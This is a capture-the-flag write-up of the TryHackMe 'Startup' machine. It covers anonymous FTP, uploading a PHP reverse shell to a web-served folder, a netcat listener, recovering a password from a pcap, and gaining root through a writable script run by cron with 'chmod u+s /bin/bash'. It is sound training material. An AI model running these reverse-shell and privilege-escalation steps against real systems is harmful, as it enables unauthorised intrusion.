---
layout: post
title: THM Startup WriteUp
date: 2025-01-11
categories:
  - TryHackMe
  - TryHackMe-Linux
tags:
  - CTF
  - TryHackMe
  - OSCP
  - Fuzzing
  - Credentials-Leakage
  - FTP-Anon-Allowed
  - PCAP-Analysis
  - FTP-HTTP-Interlinked
  - Cron-Job-Exploitation
  - Upload-File
media_subpath: /assets/img/Startup
---
![Desktop View](Startup.png){: w="400"  h="400" }



# Startup Skills


>**Startup** is an easy Linux machine where we will use the following skills:

- **Port Discovery**
- **Web Tech's Enumeration**
- **FTP Anonymous User Allowed**
- **Web Fuzzing**
- **HTTP-FTP Interlinked**
- **Uploading Reverse Shell via FTP**
- **PCAP Analysis**
- **Cron Job Exploitation**


---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **21, 22** & port **80**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.17.121 -oG allPorts
Nmap scan report for 10.10.17.121
Host is up, received user-set (1.2s latency).
Scanned at 2025-01-11 16:05:30 CET for 25s
Not shown: 37958 closed tcp ports (reset), 27574 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Then i launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p21,22,80 10.10.17.121 -oN targeted
Nmap scan report for 10.10.17.121
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.11.116.52
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.45 seconds
```

So we have to check the following ports & services:

- **Port 21 --> vsftpd 3.0.3**
- **Port 22 --> OpenSSH 7.2p2 Ubuntu 4ubuntu2.10**
- **Port 80 --> Apache httpd 2.4.18**

Let's start with the **FTP** service.

---
## Port 21 Enumeration

We can see in the `nmap` scan that the `anonymous` user is allowed, so let's check it's content.

```bash
❯ ftp 10.10.17.121
Connected to 10.10.17.121.
220 (vsFTPd 3.0.3)
Name (10.10.17.121:ne4rby): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||53835|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
```

There we are, after log in we can see a text file named `notice.txt` an image named `important.jpg`  and an empty but writable folder named `ftp`, let's download everything and check it.

```bash
ftp> prompt off
Interactive mode off.
ftp> mget *
local: important.jpg remote: important.jpg
229 Entering Extended Passive Mode (|||52685|)
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
100% |*********************************************************************************************************************************************|   245 KiB   93.99 KiB/s    00:00 ETA
226 Transfer complete.
251631 bytes received in 00:02 (83.41 KiB/s)
local: notice.txt remote: notice.txt
229 Entering Extended Passive Mode (|||13559|)
150 Opening BINARY mode data connection for notice.txt (208 bytes).
100% |*********************************************************************************************************************************************|   208        1.72 MiB/s    00:00 ETA
226 Transfer complete.
208 bytes received in 00:00 (0.95 KiB/s)
```

Let's start with the text file.

```bash
❯ catn notice.txt
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

If we check the image, it's just **Amog Us** sus meme.

![Desktop View](important.png)

But we do found a really important information, we can see in the text file the next sentence: `People downloading documents from our website will think we are a joke!`, by that we can assume that the FTP server and the HTTP server are linked and we have write permission in one of the folders of the FTP server.

So let's check the HTTP web server to see if i'm right.

## Port 80 Enumeration

At first i ran `whatweb`,  to seek for some versions and technologies used in the website:

```bash
❯ whatweb 10.10.17.121
http://10.10.17.121 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], Email[#], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.17.121], Title[Maintenance]
```

Nothing useful found aside of the `Title` field that tell us the site is in **Maintenance** , so let's take a look inside the website, once inside ***http://10.10.17.121***, we found what we were expecting, a page in maintenance.

![Desktop View](StartupMainPage.png)

Nothing in the source code, so let's see if my assumption was right, let's use `gobuster` in order to see if both services are linked.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.17.121 -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.17.121
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/files                (Status: 301) [Size: 312] [--> http://10.10.17.121/files/]
/server-status        (Status: 403) [Size: 277]
Progress: 20478 / 20479 (100.00%)
===============================================================
Finished
===============================================================
```

I found a folder named `/files`, let's see what we find inside.

![Desktop View](StartupWebIndexOf.png)

Bingo, and there is also the writable `ftp` folder, so let's upload a reverse shell.

---
## Getting a Shell

Before uploading a reverse shell i will fuzz for extensions to see what languages do the server interpret, we can do this also via `gobuster`.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -u http://10.10.17.121/files -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.17.121/files
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/web-extensions.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htm                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/.php3                (Status: 403) [Size: 277]
/.php4                (Status: 403) [Size: 277]
/.php7                (Status: 403) [Size: 277]
/.pht                 (Status: 403) [Size: 277]
/.phps                (Status: 403) [Size: 277]
/.phtml               (Status: 403) [Size: 277]
/.php5                (Status: 403) [Size: 277]

===============================================================
Finished
===============================================================
```

There we go, we can upload a **PHP** reverse shell  and it will be interpreted.

If we are using **Kali** or **Parrot**  we can find the classic [Monkey Pentester PHP Reverse Shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) at `/usr/share/webshells/laudanum/php/php-reverse-shell.php`, so let's copy it to our current directory.

```bash
cp /usr/share/webshells/laudanum/php/php-reverse-shell.php .
```

Just modify your **IP Address** & **Port** in the code and it's ready to use, then we can just upload it to the writable folder via the FTP server.

```bash
ftp> cd ftp
250 Directory successfully changed.
ftp> put php-reverse-shell.php 
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||13599|)
150 Ok to send data.
100% |********************************************************************************************************************************************|  3460       23.56 MiB/s    00:00 ETA
226 Transfer complete.
3460 bytes sent in 00:00 (10.33 KiB/s)
```

Now let's set a `netcat` listener at port 443.

```bash
nc -nvlp 443
```

Then access the reverse shell using `cURL`.

```bash
❯ curl -s http://10.10.17.121/files/ftp/php-reverse-shell.php
```

Checking the listener we should have gained a shell already.

```bash
❯ nc -nvlp 443
listening on [any] 443 ...
connect to [10.11.116.52] from (UNKNOWN) [10.10.17.121] 39488
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 15:59:55 up  2:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

---
## Shell as www-data

Once we get the reverse shell, let's find a way to scale privileges, but before, we have to get a fully interactive shell, there are multiple ways but i like to do it this way: 

```bash
script /dev/null -c bash
```

Then press *Ctrl+Z* to get the process in background.

Now that you are in your machine execute the next command:

```bash
stty raw -echo;fg
```

Now write `reset xterm` and you should have a better looking shell but you still have to execute a few commands:

```bash
export TERM=xterm
export SHELL=bash
stty rows 45 columns 184
```

Make a `stty size` in your own shell to know the rows and columns.

Now that we own a full TTY, i tried taking a look to the `user.txt` flag, but the flag is inside of `/home/lennie` and we currently have no privileges to access it.

After checking the common ways to **PrivEsc** nothing seems to work until checking if there was any unusual files/directories at the root of the system, i found a folder called `/incidents`.

```bash
www-data@startup:/$ cd incidents/
www-data@startup:/incidents$ ls -l
total 32
-rwxr-xr-x 1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng
```

Inside i found a capture called `suspicious.pcapng`, this looks quite interesting, due to that the target machine does not have `strings` binary installed let's transfer the file to our own machine.

Firstly host the file in the target machine with `python3`.

```bash
www-data@startup:/incidents$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 ...
```

Then download the file in our own machine with `wget`.

```bash
❯ wget http://10.10.17.121:8080/suspicious.pcapng
--2025-01-11 17:24:38--  http://10.10.17.121:8080/suspicious.pcapng
Connecting to 10.10.17.121:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 31224 (30K) [application/octet-stream]
Saving to: ‘suspicious.pcapng.1’

suspicious.pcapng.1                            100%[=================================================================================================>]  30.49K   122KB/s    in 0.3s    

2025-01-11 17:24:38 (122 KB/s) - ‘suspicious.pcapng.1’ saved [31224/31224]
```

Once we get the file, let's use `strings` to get just the human-readable characters of it.

```bash
❯ strings suspicious.pcapng

<REDACTED>

cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ |
.?:MD
sudo -l
sudo -l
[sudo] password for www-data: 
@	c4ntg3t3n0ughsp1c3
6%	@
Sorry, try again.
[sudo] password for www-data: 
^/Sorry, try again.
[sudo] password for www-data: 
c4ntg3t3n0ughsp1c3
sudo: 3 incorrect password attempts

<REDACTED>
```

Inspecting the output we can see multiple times what looks like a password, but seems like it's not the right password for the `www-data` user (maybe because this user don't own one), but the password `c4ntg3t3n0ughsp1c3` might work with the user `lennie`.

```bash
www-data@startup:/incidents$ su lennie
Password: c4ntg3t3n0ughsp1c3
lennie@startup:/incidents$ whoami
lennie
```

It worked, we now can access the `user.txt` flag.

```bash
lennie@startup:~$ cat user.txt 
THM{03ce******80ccbfb3******e46c0e79}
```

## Shell as Lennie

Checking **Lennie's** home directory, there is a folder named `scripts`, inside of it there are two files owned by root.

```bash
lennie@startup:~/scripts$ ls -l
total 8
-rwxr-xr-x 1 root root 77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root root  1 Jan 11 16:42 startup_list.txt
```

We can read both files, so let's check what do the script does.

```bash
lennie@startup:~/scripts$ cat planner.sh 
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

It adds the content of a variable to the `startup_list.txt` and then executes the `/etc/print.sh` script, taking a look to this script we find that is owned by `lennie` and we can modify it.

All this looks interesting but checking for cron jobs, there is nothing listed, so if the user `root` is not executing the `planner.sh` script we are going no where.

```bash
lennie@startup:~/scripts$ cat /etc/crontab 
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

At this point i get a bit lost, but checking closely we can see that the `startup_list.txt` is being modified every minute.

```bash
lennie@startup:~/scripts$ ls -l
total 8
-rwxr-xr-x 1 root root 77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root root  1 Jan 11 16:53 startup_list.txt

lennie@startup:~/scripts$ ls -l
total 8
-rwxr-xr-x 1 root root 77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root root  1 Jan 11 16:54 startup_list.txt
```

So that means that somehow the `planner.sh` is being executed and needs to be the `root` user because no one but `root` can modify `startup_list.txt` so let's modify the `/etc/print.sh` to gain a elevated shell.

```bash
lennie@startup:~/scripts$ vim /etc/print.sh 
#!/bin/bash
chmod u+s /bin/bash
```

This will add **SUID** perms to the `bash` binary.

Now let's just wait until `root` executes the script `planner.sh` and let's see if the `bash` binary converted to `SUID`.

```bash
lennie@startup:~/scripts$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
```

There we go we can see in the perms that it converted to `SUID`, so we now can spawn a elevated shell.

```bash
lennie@startup:~/scripts$ bash -p
bash-4.3# whoami
root
```

Now we can take a look at the `root.txt` flag.

```bash
bash-4.3# cat /root/root.txt 
THM{f963a******0f2102221******c3d76d}
```

---
## Final Thoughts

The **Startup CTF** was a well-balanced challenge with a straightforward exploitation phase and a privilege escalation that, while not overly difficult, was delightfully tricky. An enjoyable machine that keeps you engaged and sharpens your problem-solving skills.

![Desktop View](StartupPwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

